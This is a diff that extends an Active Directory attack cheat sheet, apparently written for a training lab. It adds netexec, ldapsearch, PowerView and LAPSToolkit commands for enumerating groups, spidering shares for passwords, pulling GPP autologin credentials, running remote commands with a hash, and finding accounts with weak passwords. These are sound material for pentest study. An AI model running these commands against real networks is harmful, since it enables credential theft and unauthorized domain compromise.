@@ -10,6 +10,9 @@ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
 # Domain group enumeration
 crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
 
+# Get members of a specific group
+netexec ldap <ip> -u <user> -p <pass> --groups "Domain Admins"
+
 # Logged on users
 crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
 
@@ -18,8 +21,47 @@ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
 
 # Spider shares for files
 crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+
+# Search share content for keywords
+netexec smb <ip> -u <user> -p <pass> --spider <share> --content --pattern "passw"
+
+# Download file from share
+netexec smb <ip> -u <user> -p <pass> --share <share> --get-file '\path\to\file' /tmp/localfile
+
+# Cat file via exec (requires admin)
+netexec smb <ip> -u <user> -H "<hash>" --share C$ -X "type C:\path\to\file.txt"
 ```
 - Results for spider_plus written to `/tmp/cme_spider_plus/<ip>.json`
+
+### NetExec LDAP Modules
+```bash
+# List module options
+netexec ldap <ip> -u <user> -p <pass> -M <module> --options
+
+# Run module with options
+netexec ldap <ip> -u <user> -p <pass> -M <module> -o KEY="value"
+
+# Group membership of specific user
+netexec ldap <ip> -u <user> -p <pass> -M groupmembership -o USER="targetuser"
+
+# Find obsolete operating systems
+netexec ldap <ip> -u <user> -p <pass> -M obsolete
+
+# Full user list (better than ldapsearch for large domains)
+netexec ldap <dc_ip> -u <user> -p <pass> -d <domain> --users
+
+# GPP autologin creds
+netexec smb <ip> -u <user> -p <pass> -M gpp_autologin
+```
+
+### ldapsearch
+```bash
+# Default ldapsearch is limited to 1000 results!
+# Use -E pr=1000/noprompt for pagination
+ldapsearch -H ldap://<dc_ip> -x -D "domain\\user" -w 'password' \
+  -b "DC=domain,DC=local" -s sub "(objectClass=user)" sAMAccountName \
+  -E pr=1000/noprompt | awk '/^sAMAccountName:/ {print $2}' > users.txt
+```
 
 ### SMBMap
 ```bash
@@ -81,6 +123,8 @@ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreigh
 ## From Windows
 
 ### PowerView
+- Use the maintained fork from BC-SECURITY: https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1
+
 ```powershell
 Import-Module .\PowerView.ps1
 
@@ -96,7 +140,7 @@ Get-DomainTrustMapping
 # Test local admin access
 Test-AdminAccess -ComputerName ACADEMY-EA-MS01
 
-# Find users with SPNs
+# Find users with SPNs (kerberoastable)
 Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 
 # Find interesting ACLs
@@ -110,6 +154,12 @@ Find-DomainUserLocation
 
 # Find interesting domain share files
 Find-InterestingDomainShareFile
+
+# Accounts not requiring a password
+Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+
+# Users with descriptions (may contain passwords)
+Get-DomainUser * | Select samaccountname,description | ?{$_.Description -ne $null}
 ```
 
 ### SharpView (.NET port of PowerView)
@@ -128,6 +178,14 @@ Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
 ### SharpHound (BloodHound Collector)
 ```powershell
 .\SharpHound.exe -c All --zipfilename ILFREIGHT
+```
+
+### LAPSToolkit
+```powershell
+Import-Module .\LAPSToolkit.ps1
+Find-LAPSDelegatedGroups
+Find-AdmPwdExtendedRights
+Get-LAPSComputers
 ```
 
 ## Privileged Access Enumeration
